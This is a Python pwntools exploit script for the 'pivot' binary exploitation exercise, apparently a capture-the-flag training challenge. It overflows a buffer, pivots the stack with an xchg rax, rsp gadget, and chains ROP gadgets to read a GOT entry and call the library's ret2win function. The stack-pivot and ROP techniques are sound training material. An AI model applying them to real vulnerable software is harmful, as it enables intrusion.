#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# Version pivoting with xch rsp,rax and execute with call rax 
# Probabely the expected version

gs='''
b *pwnme+180
c
'''
# Offset until SRBP address (save RBP)
offset=0x20

# Set up pwntools for the correct architecture
elf =  ELF('pivot')
context.binary=elf
context(terminal=['tmux', 'split-window', '-h'])

useless_func=elf.symbols['uselessFunction']
got_foothold=elf.got['foothold_function']
plt_foothold=elf.plt['foothold_function']
pwnme=elf.symbols['pwnme']

# References ELF de la librairie
libelf = ELF('libpivot.so')

# Calculate distance between ret2win and foothold_function
lib_foothold = libelf.symbols['foothold_function']
lib_ret2win = libelf.symbols['ret2win']
off_ret2win=lib_ret2win-lib_foothold

# Gadgets
g_leave = pwnme+181
g_xchgraxrsp   = 0x004009bd # xchg rax, rsp ; ret
g_poprax   = 0x04009bb  # pop rax; ret
g_poprbp   = 0x0400808  # pop rbp; ret
g_addrax   = 0x04009c4  # add rax, rbp; ret
g_callrax  = 0x04006b0  # call rax
g_movraxrax= 0x04009c0  # mov rax, qword ptr [rax] ; ret

io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)


io.recvuntil(b"to pivot:")
leak = io.recvline().rstrip()
print(leak)
leak = int(leak,16)
log.info(f"{leak=:x}")

# Message 1
# Version : read the GOT then jump ret2win with call rax
PL=p64(plt_foothold)
PL+=p64(g_poprax)
PL+=p64(got_foothold)
PL+=p64(g_movraxrax)
PL+=p64(g_poprbp)
PL+=p64(off_ret2win)
PL+=p64(g_addrax)
PL+=p64(g_callrax)


io.sendlineafter(b"> ",PL)

# Message 2 : pivot
PL =b"A"*offset
PL+=p64(0xdeadbeef) # popped by rbp
PL+=p64(g_poprax)
PL+=p64(leak)
PL+=p64(g_xchgraxrsp)
io.sendlineafter(b"> ",PL)

io.interactive()

